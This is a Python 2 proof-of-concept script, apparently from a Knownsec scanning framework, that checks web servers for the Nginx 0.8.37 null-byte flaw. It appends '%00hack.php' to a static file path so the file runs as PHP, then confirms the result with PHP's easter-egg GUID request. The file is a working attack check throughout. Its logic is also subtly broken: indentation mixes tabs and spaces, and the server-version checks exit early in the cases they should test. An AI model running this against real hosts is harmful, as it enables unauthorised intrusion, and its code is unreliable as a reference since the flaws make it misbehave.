#!/usr/bin/env python
# coding=utf-8

import re
import urllib2
from comm import cmdline
from comm import generic
from urlparse import urlparse

''' 必填值： poc_info 字典必写，记录poc信息，不可用其他名字必须poc_info '''
poc_info = {
    'VulId'                     : '0631',                                                     # webvul的ID号
    'Name'                   : 'Nginx 0.8.37 Null Byte Code Execution poc',  # poc的名字，首字母大写
    'AppName'           : 'Nginx',                                 # app名称
    'AppPowerLink'   : 'http://nginx.org/',             # app官网地址
    'AppVersion'        : '0.8.37',                                                    # app程序详细版本
    'VulType'               : 'Code Execution',                                     # 漏洞类型名称
    'Desc'                     : '''
                    Nginx is webserver which fail to resolve the url request in version 0.8.37 so 
					that a attacker can make the webserver execute jpg file as a php file
                    ''', 
    'Author'                : ['shanyi @ Knownsec'],                            # 完成人
    'VulDate'              :  '2011-07-20',                                     # 漏洞首发时间
    'CreateDate'        : '2012-05-04',                                     # 编写此poc的时间
    'UpdateDate'       : '2012-05-04',                                     # 最后一次更新此poc的时间
    'References'        : [''],    # 与漏洞相关的链接
    'Version'               : '1',                                              # 本poc的版本，一般为1，若有第二次更新改为2,以此类推
}


''' 必填值：io_info 字典必写，记录输入输出信息，名字不可变必须叫io_info，这是个全局变量！！！'''
io_info = {
    'URL'           : '',
    'Mode'       : 'v',          # 默认值为 v 代表 verify
    'Verbose'   : False,        # 默认值为False代表不打印详细信息
    'Error'         : '',           # 记录poc失败信息
    'Status'       : 0,            # 默认值为0代表poc没执行成功，执行成功必须更新该值为1
    'Result'      : {},
}

def urljoin(base, url):
	from urlparse import urljoin
	from urlparse import urlparse
	from urlparse import urlunparse
	from posixpath import normpath
	url1 = urljoin(base, url)
	arr = urlparse(url1)
	path = normpath(arr[2])
	return urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))


def main(io_info): 
	'''interface function, io_info is a global io dict'''
	url = io_info.get('URL','') 
	mode = io_info.get('Mode','v')
	verbose = io_info.get('Verbose', False)
	headers_fake = generic.modify_headers(io_info)

	if (mode == 'v' or mode == 'a'):
		# request 和 response 是用来进行攻击
		# 构造url
		if verbose:
			print '[*] Request url : %s' % url
		try:
			request0 = urllib2.Request(url+'/the_file_that_should_never_exist_on_server.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42' ,headers=headers_fake)
			response0 = urllib2.urlopen(request0)
			if verbose:
				print '[*] Content-Type is ',response0.headers.get('Content-Type')
			if response0.headers.get('Content-Type')=='image/gif':
				#如果404页面是php，那么就直接放弃尝试。避免误报。因为后面判断方式是基于彩蛋的。
				if verbose:
					print '[*] Found 404 page type is php, skip...'
				return
		except:
			pass
		request = urllib2.Request(url ,headers=headers_fake)
		try:
			response1 = urllib2.urlopen(request)
			server = response1.headers.get('Server',None)
			if verbose:
				print '[*] Server is %s' % server
			if not server:
				return
			arr = server.split('/')
            #版本不详的，只判断是nginx就ok
            if arr[0]=='nginx':
                return
            #否则，还要判断版本。
            if len(arr)==2:
                if arr[1]<='0.8.37':
                    return
			html=response1.read()
			match1=re.findall('src="(.*?\.(ico|jpg|gif|png|bmp))"',html)
			match2=re.findall('href="(.*?\.(css|rar|zip|txt))"',html)
			if match1:
				if "http://" not in match1[0][0]:
					url=urljoin(url,match1[0][0])
				else:
					if urlparse(match1[0][0]).netloc.split(':')[0]==urlparse(url).netloc.split(':')[0]:
						url=match1[0][0]
					else:
						return
			elif match2:
				if "http://" not in match2[0][0]:
					url=urljoin(url,match2[0][0])
				else:
					if urlparse(match2[0][0]).netloc.split(':')[0]==urlparse(url).netloc.split(':')[0]:
						url=match2[0][0]
					else:
						return
			else:
				url=url+"/robots.txt"
			url=url+"%00hack.php"
			request2 = urllib2.Request(url ,headers=headers_fake)
			response2 = urllib2.urlopen(request2)
			back_url=response2.url
			# 验证攻击是否成功
			if verbose:
				print '[*] check the url headers ...'
			if (response2.headers.get('Content-Type')== 'text/html' ) and (url==back_url):
				if verbose:
					print '[*] headers.Content-Type is text/html '
				url=url+'?=PHPE9568F34-D428-11d2-A769-00AA001ACF42'
				request3 = urllib2.Request(url ,headers=headers_fake)
				response3 = urllib2.urlopen(request3)
				if response3.headers.get('Content-Type')=='image/gif':
					io_info['Status'] = 1
					io_info['Result']['VerifyInfo'] = {}
					io_info['Result']['VerifyInfo']['URL'] = url
			else:
				if verbose:
					print '[*] headers.Content-Type is text/plain'
				io_info['Status'] = 0

		except urllib2.URLError, e:
			if hasattr(e, 'reason'):
				io_info['Error'] = 'We failed to reach a server. Reason: %s' % e.reason
			elif hasattr(e, 'code'):
				io_info['Error'] = '''The website is safe or the server couldn\'t fulfill the request. Error code: %s''' % `e.code`





if __name__=="__main__":
	# usage表示poc命令行运行的使用帮助，如果留空则使用默认的
	# 如果没有特殊命令行附加参数，则argvs可为空，默认参数有-u/--url，-m/--mode，-v
	# 如果有附加参数，修改usage以及argvs
	cmdline.main(io_info, usage='python %s -u http://example.com [-m a] [-v] ') 
	if io_info['Verbose']:
		print '\n[*] Init ...\n'
	main(io_info)
	print generic.output(io_info)
